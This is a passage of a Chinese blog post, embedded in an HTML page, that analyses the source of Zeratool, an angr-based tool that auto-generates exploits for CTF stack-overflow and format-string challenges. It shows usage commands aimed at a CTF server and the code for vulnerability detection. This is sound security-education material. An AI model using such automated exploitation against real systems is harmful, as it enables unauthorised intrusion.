@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>zeratool：基于 angr 的CTF pwn 自动化利用工具介绍 - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="文章首发于 先知社区
+ 前言 Zeratool 实现了针对 CTF 中的 pwn 题的自动化利用生成（Automatic Exploit Generation）以及远程获取 flag。
+它基于 angr, 探索程序未约束的状态，继而分析状态的寄存器信息和内存布局，设定约束，对约束进行求解，结合 pwntools 编写脚本，提交 payload 到远程 CTF 服务器获得 flag。
+本篇文章结合源码对 zeratool 的实现思路进行分析。通过阅读该文，可以对angr 和 pwn的自动化利用进一步认识。
+注：zeratool 基于 angr7 ，不兼容当前的 angr8
+使用 Zeratool 主要针对栈溢出和格式化字符串漏洞，实现的漏洞利用方式如下：
+ 栈溢出漏洞——修改 pc：win function / shellcode / rop chain /one gadget 格式化字符串——修改 got 表项: win function / shellcode  zeratool 接收 binary 作为参数，同时可以配置其他选项：
+[chris:~/Zeratool] [angr] python zeratool.py -h usage: zeratool.py [-h] [-l LIBC] [-u URL] [-p PORT] [-v] file positional arguments: file File to analyze optional arguments: -h, --help show this help message and exit # 帮助信息 -l LIBC, --libc LIBC libc to use # 指定 libc  -u URL, --url URL Remote URL to pwn # 远程 Url  -p PORT, --port PORT Remote port to pwn # 远程端口 -v, --verbose Verbose mode # 设置调试模式 使用示例：">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">zeratool：基于 angr 的CTF pwn 自动化利用工具介绍</h1>
+		<div class="post-meta">February 18, 2020</div>
+	</header>
+	<div class="post-content"><blockquote>
+<p>文章首发于 <a href="https://xz.aliyun.com/t/7224">先知社区</a></p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool">Zeratool</a> 实现了针对 CTF 中的 pwn 题的自动化利用生成（Automatic Exploit Generation）以及远程获取 flag。</p>
+<p>它基于 angr,  探索程序未约束的状态，继而分析状态的寄存器信息和内存布局，设定约束，对约束进行求解，结合 <a href="https://github.com/Gallopsled/pwntools">pwntools</a>  编写脚本，提交 payload 到远程 CTF 服务器获得 flag。</p>
+<p>本篇文章结合源码对 zeratool 的实现思路进行分析。通过阅读该文，可以对angr 和 pwn的自动化利用进一步认识。</p>
+<p>注：zeratool 基于 angr7 ，不兼容当前的 angr8</p>
+<h2 id="使用">使用</h2>
+<p>Zeratool 主要针对栈溢出和格式化字符串漏洞，实现的漏洞利用方式如下：</p>
+<ul>
+<li>栈溢出漏洞——修改 pc：<code>win function / shellcode / rop chain /one gadget</code></li>
+<li>格式化字符串——修改 got 表项: <code>win function / shellcode</code></li>
+</ul>
+<p><code>zeratool</code> 接收 <code>binary</code> 作为参数，同时可以配置其他选项：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[chris:<span style="color:#f92672">~/</span>Zeratool] [angr] python zeratool<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>h
+usage: zeratool<span style="color:#f92672">.</span>py [<span style="color:#f92672">-</span>h] [<span style="color:#f92672">-</span>l LIBC] [<span style="color:#f92672">-</span>u URL] [<span style="color:#f92672">-</span>p PORT] [<span style="color:#f92672">-</span>v] file
+
+positional arguments:
+  file                  File to analyze
+
+optional arguments:
+  <span style="color:#f92672">-</span>h, <span style="color:#f92672">--</span>help            show this help message <span style="color:#f92672">and</span> exit <span style="color:#75715e"># 帮助信息</span>
+  <span style="color:#f92672">-</span>l LIBC, <span style="color:#f92672">--</span>libc LIBC  libc to use                     <span style="color:#75715e"># 指定 libc </span>
+  <span style="color:#f92672">-</span>u URL, <span style="color:#f92672">--</span>url URL     Remote URL to pwn               <span style="color:#75715e"># 远程 Url </span>
+  <span style="color:#f92672">-</span>p PORT, <span style="color:#f92672">--</span>port PORT  Remote port to pwn              <span style="color:#75715e"># 远程端口</span>
+  <span style="color:#f92672">-</span>v, <span style="color:#f92672">--</span>verbose         Verbose mode                    <span style="color:#75715e"># 设置调试模式</span>
+</code></pre></div><p>使用示例：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/bin/bash</span>
+<span style="color:#75715e">#Buffer Overflows with win functions </span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>ret <span style="color:#f92672">-</span>u ctf<span style="color:#f92672">.</span>hackucf<span style="color:#f92672">.</span>org <span style="color:#f92672">-</span>p <span style="color:#ae81ff">9003</span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>bof3 <span style="color:#f92672">-</span>u ctf<span style="color:#f92672">.</span>hackucf<span style="color:#f92672">.</span>org <span style="color:#f92672">-</span>p <span style="color:#ae81ff">9002</span>
+
+<span style="color:#75715e">#Format string leak</span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>easy_format
+<span style="color:#75715e">#Format string point to win function</span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>medium_format
+<span style="color:#75715e">#Format string point to shellcode</span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>hard_format <span style="color:#75715e">#有时需要运行两遍 </span>
+
+<span style="color:#75715e">#Buffer overflow point to shellcode</span>
+python zeratool<span style="color:#f92672">.</span>py challenges<span style="color:#f92672">/</span>demo_bin
+</code></pre></div><p>接下来，我将结合源码介绍 zeratool 的思想。</p>
+<h2 id="源码分析">源码分析</h2>
+<h3 id="目录">目录</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">zeratool<span style="color:#f92672">.</span>py <span style="color:#75715e">#顶层模块</span>
+lib
+	<span style="color:#f92672">-</span> formatDetector<span style="color:#f92672">.</span>py               <span style="color:#75715e">#检测格式化字符串漏洞</span>
+	<span style="color:#f92672">-</span> formatExploiter<span style="color:#f92672">.</span>py              <span style="color:#75715e">#利用格式化字符串漏洞</span>
+	<span style="color:#f92672">-</span> formatLeak<span style="color:#f92672">.</span>py                   <span style="color:#75715e"># 检查信息泄露</span>
+	<span style="color:#f92672">-</span> inputDetector<span style="color:#f92672">.</span>py                <span style="color:#75715e"># 检查输入类型</span>
+	<span style="color:#f92672">-</span> overflowDetector<span style="color:#f92672">.</span>py             <span style="color:#75715e"># 检查缓冲区溢出</span>
+	<span style="color:#f92672">-</span> overflowExploitSender<span style="color:#f92672">.</span>py        <span style="color:#75715e"># 发送 exploit</span>
+	<span style="color:#f92672">-</span> overflowExploiter<span style="color:#f92672">.</span>py            <span style="color:#75715e"># 利用缓冲区溢出</span>
+	<span style="color:#f92672">-</span> protectionDetector<span style="color:#f92672">.</span>py           <span style="color:#75715e"># 检查保护机制</span>
+	<span style="color:#f92672">-</span> winFunctionDetector<span style="color:#f92672">.</span>py          <span style="color:#75715e"># 检查目标函数</span>
+</code></pre></div><p>lib 下包含各个模块，实现了漏洞自动化利用的相关接口，zeratool.py 负责顶层调用。lib 模块可以粗略分为三类：信息检测/漏洞检测/漏洞利用。接下来分模块介绍</p>
+<h3 id="顶层接口">顶层接口</h3>
+<h4 id="zeratool"><strong>zeratool</strong></h4>
+<p>zeratool 调用顶层接口，总体逻辑大致如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200214160404-91943af0-4f00-1.png" alt="a"></p>
+<p>zeratool 关于利用的属性会存储在 <code>properties</code> 字典中，如以下属性</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;position&#39;</span>] 
+properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] 
+properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;input&#39;</span>] <span style="color:#75715e"># 输入字符串</span>
+properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#75715e"># 漏洞类型，分为 Overflow / Format</span>
+properties[<span style="color:#e6db74">&#39;pwn&#39;</span>][<span style="color:#e6db74">&#39;exploit&#39;</span>]
+properties[<span style="color:#e6db74">&#39;input_type&#39;</span>]     <span style="color:#75715e">#输入方式</span>
+properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>]  <span style="color:#75715e">#如有目标函数，存在这里</span>
+properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>][func][<span style="color:#e6db74">&#39;fcn_addr&#39;</span>]
+properties[<span style="color:#e6db74">&#39;protections&#39;</span>][<span style="color:#e6db74">&#39;got&#39;</span>]
+properties[<span style="color:#e6db74">&#39;libc&#39;</span>]
+</code></pre></div><p>首先读取二进制程序，调用接口检测漏洞类型：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>] <span style="color:#f92672">=</span> overflowDetector<span style="color:#f92672">.</span>checkOverflow(args<span style="color:#f92672">.</span>file,inputType<span style="color:#f92672">=</span>properties[<span style="color:#e6db74">&#39;input_type&#39;</span>])
+    <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">is</span> None:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Checking for format string pwn type...&#34;</span>)
+        properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>] <span style="color:#f92672">=</span> formatDetector<span style="color:#f92672">.</span>checkFormat(args<span style="color:#f92672">.</span>file,inputType<span style="color:#f92672">=</span>properties[<span style="color:#e6db74">&#39;input_type&#39;</span>])
+</code></pre></div><ul>
+<li><code>overflowDetector.checkOverflow</code>  检测缓冲区溢出漏洞</li>
+<li><code>formatDetector.checkFormat</code> 检测格式化字符串漏洞</li>
+</ul>
+<p>这个两个接口均会返回一个字典存储在 <code>properties['pwn_type']</code> 下，包含漏洞的一些信息</p>
+<p>包含的信息如下：</p>
+<ul>
+<li>栈溢出情况：<code>type / input</code></li>
+<li>格式化字符串情况：<code>type / position / length / input</code></li>
+</ul>
+<p>获得保护机制信息：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">properties[<span style="color:#e6db74">&#39;protections&#39;</span>] <span style="color:#f92672">=</span> protectionDetector<span style="color:#f92672">.</span>getProperties(args<span style="color:#f92672">.</span>file)
+</code></pre></div><p>接下来，为漏洞利用部分，如果是格式化字符串漏洞，检查是否可以直接通过泄露获得 flag，如果获得 flag 则直接结束。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Format&#34;</span>:
+        properties[<span style="color:#e6db74">&#39;pwn&#39;</span>] <span style="color:#f92672">=</span> formatLeak<span style="color:#f92672">.</span>checkLeak(args<span style="color:#f92672">.</span>file,properties) <span style="color:#75715e"># 检测 flag 泄露</span>
+        <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn&#39;</span>][<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">and</span> args<span style="color:#f92672">.</span>url <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;&#34;</span>:     <span style="color:#75715e"># 连接远程服务器</span>
+            properties[<span style="color:#e6db74">&#39;pwn&#39;</span>][<span style="color:#e6db74">&#39;exploit&#39;</span>] <span style="color:#f92672">=</span> formatLeak<span style="color:#f92672">.</span>checkLeak(args<span style="color:#f92672">.</span>file,properties,remote_server<span style="color:#f92672">=</span>True,remote_url<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>url,port_num<span style="color:#f92672">=</span>int(args<span style="color:#f92672">.</span>port))
+        <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn&#39;</span>][<span style="color:#e6db74">&#39;flag_found&#39;</span>]:   <span style="color:#75715e"># 找到 flag, 直接退出</span>
+            exit(<span style="color:#ae81ff">0</span>)
+
+</code></pre></div><p>检查程序中是否有目标函数（利用时直接劫持控制流到该函数即可）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>] <span style="color:#f92672">=</span> winFunctionDetector<span style="color:#f92672">.</span>getWinFunctions(args<span style="color:#f92672">.</span>file)
+</code></pre></div><p>接下来，如果是缓冲区溢出漏洞，调用 <code>exploitOverflow</code> ，通过约束求解获得 <code>input</code> 值，发送 <code>expoit</code>。若是格式化字符串漏洞，则调用 <code>exploitFormat</code> 接口。如果可以成功利用并提供了 url，则连接远程服务器。无法利用则输出  <code>[-] Can not determine vulnerable type</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Overflow&#34;</span>:
+        properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;results&#39;</span>] <span style="color:#f92672">=</span> overflowExploiter<span style="color:#f92672">.</span>exploitOverflow(args<span style="color:#f92672">.</span>file, properties, inputType<span style="color:#f92672">=</span>properties[<span style="color:#e6db74">&#39;input_type&#39;</span>])  <span style="color:#75715e"># 利用缓冲区溢出漏洞</span>
+        <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;results&#39;</span>][<span style="color:#e6db74">&#39;input&#39;</span>]:
+            properties[<span style="color:#e6db74">&#39;send_results&#39;</span>] <span style="color:#f92672">=</span> overflowExploitSender<span style="color:#f92672">.</span>sendExploit(args<span style="color:#f92672">.</span>file,properties)  <span style="color:#75715e"># 如果可以成功利用</span>
+            <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;send_results&#39;</span>][<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">and</span> args<span style="color:#f92672">.</span>url <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;&#34;</span>:
+                properties[<span style="color:#e6db74">&#39;remote_results&#39;</span>] <span style="color:#f92672">=</span> overflowExploitSender<span style="color:#f92672">.</span>sendExploit(args<span style="color:#f92672">.</span>file,properties,remote_server<span style="color:#f92672">=</span>True,remote_url<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>url,port_num<span style="color:#f92672">=</span>int(args<span style="color:#f92672">.</span>port))  <span style="color:#75715e"># 连接远程服务器利用</span>
+
+    <span style="color:#66d9ef">elif</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Format&#34;</span>:
+        properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;results&#39;</span>] <span style="color:#f92672">=</span> formatExploiter<span style="color:#f92672">.</span>exploitFormat(args<span style="color:#f92672">.</span>file,properties) <span style="color:#75715e"># 利用格式化字符串漏洞</span>
+        <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>] <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;flag_found&#39;</span> <span style="color:#f92672">in</span>  properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>]<span style="color:#f92672">.</span>keys() <span style="color:#f92672">and</span> properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;results&#39;</span>][<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">and</span> args<span style="color:#f92672">.</span>url <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;&#34;</span>:  <span style="color:#75715e"># 如果可以成功利用</span>
+            properties[<span style="color:#e6db74">&#39;pwn_type&#39;</span>][<span style="color:#e6db74">&#39;send_results&#39;</span>] <span style="color:#f92672">=</span> formatExploiter<span style="color:#f92672">.</span>getRemoteFormat(properties,remote_url<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>url,remote_port<span style="color:#f92672">=</span>int(args<span style="color:#f92672">.</span>port))   <span style="color:#75715e"># 连接远程服务器利用</span>
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Can not determine vulnerable type&#34;</span>)
+</code></pre></div><p>以上就是 zeratool 自动化解题的顶层逻辑，接下来深入介绍各个模块。</p>
+<h3 id="信息检测">信息检测</h3>
+<h4 id="检查保护机制">检查保护机制</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/protectionDetector.py">protectionDetector.py</a></p>
+<p>检测 binary 信息/保护机制，获取相关属性保存在 <code>properties</code> 中，如下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">binary <span style="color:#f92672">=</span> ELF(binary_name)
+properties[<span style="color:#e6db74">&#39;aslr&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>aslr
+properties[<span style="color:#e6db74">&#39;arch&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>arch
+properties[<span style="color:#e6db74">&#39;canary&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>canary
+properties[<span style="color:#e6db74">&#39;got&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>got
+properties[<span style="color:#e6db74">&#39;nx&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>nx
+properties[<span style="color:#e6db74">&#39;pie&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>pie
+properties[<span style="color:#e6db74">&#39;plt&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>plt
+properties[<span style="color:#e6db74">&#39;relro&#39;</span>] <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>relro
+</code></pre></div><h4 id="检查输入类型">检查输入类型</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/inputDetector.py">inputDetector.py</a></p>
+<p>分为三种 <code>stdin /arg /libpwnable </code></p>
+<p>通过判断是否存在 <code>'fgets','gets','scanf','read'</code>函数确定是否从 <code>stdin</code> 获取输入。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">reading_functions <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;fgets&#39;</span>,<span style="color:#e6db74">&#39;gets&#39;</span>,<span style="color:#e6db74">&#39;scanf&#39;</span>,<span style="color:#e6db74">&#39;read&#39;</span>]
+binary_functions <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>loader<span style="color:#f92672">.</span>main_object<span style="color:#f92672">.</span>imports<span style="color:#f92672">.</span>keys()
+<span style="color:#75715e">#Match reading functions against local functions</span>
+<span style="color:#66d9ef">if</span> any([x <span style="color:#f92672">in</span> reading_functions <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> binary_functions]):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;STDIN&#34;</span>
+<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ARG&#34;</span>
+</code></pre></div><p>文中会针对 STDIN 的情况进行讲解，这也是一般情况，ARG 和 LIBPWNABLE 两种输入类型会选择性忽略，不过利用思想大致相似，只是一些数据处理逻辑不同。</p>
+<h4 id="检查目标函数">检查目标函数</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/winFunctionDetector.py">winFunctionDetector.py</a></p>
+<p>检测 binary 是否有目标函数(<code>winFunction</code>), 分为两种: 一种为调用 <code>system(/bin/sh)</code>，另一种为读取 <code>flag.txt</code></p>
+<p>使用 r2 进行分析</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> r2 <span style="color:#f92672">=</span> r2pipe<span style="color:#f92672">.</span>open(binary_name)
+ r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;aaa&#39;</span>)
+</code></pre></div><ul>
+<li>检测 <code>system</code> 函数调用</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  functions <span style="color:#f92672">=</span> [func <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>loads(r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;aflj&#39;</span>))] <span style="color:#75715e"># 获得函数列表</span>
+    <span style="color:#75715e">#Check for function that gives us system(/bin/sh)</span>
+    <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> functions:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;system&#39;</span> <span style="color:#f92672">in</span> str(func[<span style="color:#e6db74">&#39;name&#39;</span>]):
+            system_name <span style="color:#f92672">=</span> func[<span style="color:#e6db74">&#39;name&#39;</span>]
+            <span style="color:#75715e">#获得交叉引用</span>
+            refs <span style="color:#f92672">=</span> [func <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>loads(r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;axtj @ {}&#39;</span><span style="color:#f92672">.</span>format(system_name)))]
+            <span style="color:#66d9ef">for</span> ref <span style="color:#f92672">in</span> refs:
+                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;fcn_name&#39;</span> <span style="color:#f92672">in</span> ref:
+                    winFunctions[ref[<span style="color:#e6db74">&#39;fcn_name&#39;</span>]] <span style="color:#f92672">=</span> ref <span style="color:#75715e">#存储函数信息及引用</span>
+</code></pre></div><p>通过 r2 命令：<code>aflj</code> 获得 <code>json</code> 格式的函数列表，遍历该列表，找到函数名包含 <code>system</code> 的函数，使用 <code>axt [addr]</code> 命令获得代码段和数据段对函数的引用。将引用函数的信息存储在 <code>winFunctions[ref['fcn_name']]</code>  中。</p>
+<ul>
+<li>检测 flag 读取</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    known_flag_names <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;flag&#34;</span>,<span style="color:#e6db74">&#34;pass&#34;</span>] <span style="color:#75715e"># 标志字符串</span>
+    strings <span style="color:#f92672">=</span> [string <span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>loads(r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;izj&#39;</span>))] <span style="color:#75715e">#获得 data 段的字符串</span>
+    <span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> strings:
+        value <span style="color:#f92672">=</span> string[<span style="color:#e6db74">&#39;string&#39;</span>]
+        decoded_value <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(value)
+        <span style="color:#66d9ef">if</span> any([x <span style="color:#f92672">in</span> decoded_value <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> known_flag_names]): <span style="color:#75715e"># 查看字符串是否包含 flag/ pass</span>
+            address <span style="color:#f92672">=</span> string[<span style="color:#e6db74">&#39;vaddr&#39;</span>] <span style="color:#75715e"># 获得字符串的地址</span>
+            <span style="color:#75715e">#获得交叉引用信息</span>
+            refs <span style="color:#f92672">=</span> [func <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>loads(r2<span style="color:#f92672">.</span>cmd(<span style="color:#e6db74">&#39;axtj @ {}&#39;</span><span style="color:#f92672">.</span>format(address)))]
+            <span style="color:#66d9ef">for</span> ref <span style="color:#f92672">in</span> refs:
+                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;fcn_name&#39;</span> <span style="color:#f92672">in</span> ref:
+                    winFunctions[ref[<span style="color:#e6db74">&#39;fcn_name&#39;</span>]] <span style="color:#f92672">=</span> ref
+</code></pre></div><p>通过r2 的 <code>izj</code> 命令获得数据段的字符串（in JSON)，遍历字符串，查看是否包含 “flag” 或 “pass&quot; 字符串，如果包含，通过访问 <code>vaddr</code> 属性，获得字符串的地址，再通过 axtj 命令获取有关该地址的引用信息，将信息存储在 <code>winFunctions[ref['fcn_name']]</code> 中。</p>
+<blockquote>
+<p>注：any() 函数用于判断给定的可迭代参数 iterable 是否全部为 False，则返回 False，如果有一个为 True，则返回 True。</p>
+</blockquote>
+<h3 id="漏洞检测">漏洞检测</h3>
+<h4 id="检查溢出漏洞">检查溢出漏洞</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/overflowDetector.py">overflowDetector.py</a>  检查是否有溢出漏洞。</p>
+<p>探索路径:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">try</span>:
+    <span style="color:#a6e22e">@timeout_decorator.timeout</span>(<span style="color:#ae81ff">120</span>) <span style="color:#75715e"># 设置 timeout </span>
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploreBinary</span>(simgr):
+        <span style="color:#75715e"># 探索程序状态</span>
+        simgr<span style="color:#f92672">.</span>explore(find<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> s: <span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>globals,step_func<span style="color:#f92672">=</span>overflow_filter)
+        
+   exploreBinary(simgr)
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;found&#39;</span> <span style="color:#f92672">in</span> simgr<span style="color:#f92672">.</span>stashes <span style="color:#f92672">and</span> len(simgr<span style="color:#f92672">.</span>found):   <span style="color:#75715e"># 如果找到目标状态</span>
+        end_state <span style="color:#f92672">=</span> simgr<span style="color:#f92672">.</span>found[<span style="color:#ae81ff">0</span>]                      <span style="color:#75715e"># 探索到的可利用状态</span>
+        run_environ[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> end_state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#75715e"># 漏洞类型</span>
+</code></pre></div><p>调用模拟管理器的 <code>explore</code> 接口探索程序状态，直到找到 state 的 globals  包含 <code>type</code> 信息。（type 代表漏洞类型，说明找到漏洞）， 指定 <code>step_function</code> 为 <code>overflow_filter</code> 。每次 stash 中的状态 step forward 时都运行该函数。</p>
+<p>我们来看一下 <code>overflow_filter</code> 的实现。</p>
